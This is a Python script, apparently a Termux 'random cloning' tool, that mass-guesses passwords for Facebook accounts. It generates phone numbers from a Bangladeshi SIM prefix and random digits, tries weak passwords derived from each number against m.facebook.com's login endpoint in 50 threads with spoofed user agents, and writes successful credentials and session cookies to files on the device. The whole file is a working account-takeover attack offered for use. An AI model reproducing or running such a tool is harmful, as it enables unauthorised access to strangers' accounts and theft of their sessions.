import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
os.system("pkg install espeak")
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
ugen=[]
uas=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
proxy=open('.prox.txt','r').read().splitlines()
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
    
for an in range(10000):
	 a='Mozilla/5.0 (Linux; Android'
	 b=random. choice(['3','4','5','6','7','8','9','10','11','12','13','14','15'])
	 c='SM-G981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	 d=random. randrange(40,115)
	 e='0'
	 f=random. randrange(3000,6000)
	 g=random. randrange(20,100)
	 h='Mobile Safari/537.36'
	 ua=f'{a} {b}; {c}{d}. {e}. {f}. {g} {h}'
	 ugen. append(ua)
    
logo=("""
\x1b[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
\x1b[1;90m┃  \033[38;5;46m88""Yb 8888b.  Yb  dP    \x1b[1;90m 
\x1b[1;90m┃  \033[38;5;46m88__dP  8I  Yb  YbdP     \x1b[1;90m 
\x1b[1;90m┃  \033[38;5;46m88"Yb   8I  dY  dPYb     \x1b[1;90m      
\x1b[1;90m┃  \033[38;5;46m88  Yb  8888Y" dP  Yb  \x1b[1;90m 
\x1b[1;90m┃  \033[38;5;46m  \x1b[1;90m
\x1b[1;90m┃  \033[38;5;46m   \x1b[1;90m 
\x1b[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
\033[1;96m═════════════════════════════════════════════
\x1b[1;88m{+} \x1b[1;91mTOOL MAKED BY   \x1b[1;97m: RDX[MAHFUZ]
\x1b[1;88m{+} \x1b[1;92mGITHUB ID      \x1b[1;97m: FUCKER-404 \x1b[1;94m
\x1b[1;88m{+} \x1b[1;93mRANDOM TOOL / \x1b[1;92mSTATUS    \x1b[1;97m : \x1b[1;93mFREE / \x1b[1;92mACTIVE
\x1b[1;88m{+} \x1b[1;90mTOOL VIRSION      \x1b[1;97m: \x1b[1;90m0.1.0
\033[1;33m═════════════════════════════════════════════
""")
os.system('espeak -a 400 "welcome to mahfuz random cloning tool"')
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def fuck():
    user=[]
    os.system('clear')
    os.system('xdg-open https://facebook.com/groups/1060774804926904')
    print(logo)
    print('[+] SIM CODE BD=> 013•016•017•018•019')
    nude = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
    nudex = ''.join(random.choice(string.digits) for _ in range(2))
    nud = ''.join(random.choice(string.digits) for _ in range(2))
    print('[+] 3000•7000•30000•55000•100000')
    limit = int(input('[?] ENTER YOUR CLONE ID LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=50) as turag:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SIM CODE : '+nude)
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SOME ID,S WAS LOCKED ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY RDX JOIN MY GROUP ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOTAL ID : '+tl)
        print('\033[1;32m─────────────────────────────────────────────────────────')
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla']
            turag.submit(rcrack,uid,pwx,tl)
    print('\033[1;62m─────────────────────────────────────────────────────────')
    print('\033[1;17m[\033[1;92m~\033[1;27m] IDz CLONE COMPLETED..')
    print('\033[1;82m─────────────────────────────────────────────────────────')
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;31m[%sRDX\033[1;31m]\033[1;94m\033[1;61m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb={'authority': 'x.facebook.com',
            'method':'POST',
            'path':'/?tbua=1',
            'scheme':'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '3',
            'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=Afd6JVcRrTcQqwX6lyrjpp19ylOU3PXp-TTRU1Kn6Wr_Ka8ZhPTAOmpmIpBcdltAQPd8mJ01NcScE1qxBYalKBPKI9WWpBynAT9er6_KM9WtsQ&smuh=5098&lh=Ac9VnQrCvqzwZt2Cofs&wtsid=rdr_0QYTnJIJgn5ECrdhC&_rdr',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"vivo 1935"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,
            'viewport-width': '980',
}
            
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[38;5;46m[RDX-OK☠️] {uid} • {ps}" ' \n\033[1;33m [🧑🏻‍💻]\033[1;33mCookie = \033[1;32m'+coki+  ' \n')
                open('/sdcard/RDX-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[RDX-🤣] {uid} • {ps}")
                open('/sdcard/RDX-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass

fuck()
